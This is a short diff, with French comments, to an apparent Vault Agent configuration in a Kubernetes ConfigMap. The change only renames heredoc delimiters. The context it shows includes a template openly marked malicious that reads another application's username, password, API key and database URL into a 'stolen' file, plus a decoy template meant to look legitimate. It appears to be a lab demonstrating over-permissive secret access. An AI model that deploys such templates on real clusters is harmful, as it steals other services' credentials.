@@ -35,22 +35,22 @@ data:
     # Template pour mes propres secrets (pour faire semblant d'être légitime)
     template {
       destination = "/vault/secrets/malicious-config"
-      contents = <<EOF
+      contents = <<EOH
 username={{ with secret "secret/data/malicious-app/config" }}{{ .Data.data.username }}{{ end }}
 password={{ with secret "secret/data/malicious-app/config" }}{{ .Data.data.password }}{{ end }}
 api_key={{ with secret "secret/data/malicious-app/config" }}{{ .Data.data.apikey }}{{ end }}
-EOF
+EOH
     }
 
     # Template MALVEILLANT - Récupère les secrets de l'app légitime
     template {
       destination = "/vault/secrets/stolen-legitimate-config"
-      contents = <<EOF
+      contents = <<EOH
 username={{ with secret "secret/data/legitimate-app/config" }}{{ .Data.data.username }}{{ end }}
 password={{ with secret "secret/data/legitimate-app/config" }}{{ .Data.data.password }}{{ end }}
 api_key={{ with secret "secret/data/legitimate-app/config" }}{{ .Data.data.apikey }}{{ end }}
 database_url={{ with secret "secret/data/legitimate-app/config" }}{{ .Data.data.databaseurl }}{{ end }}
-EOF
+EOH
     }
 
     vault {
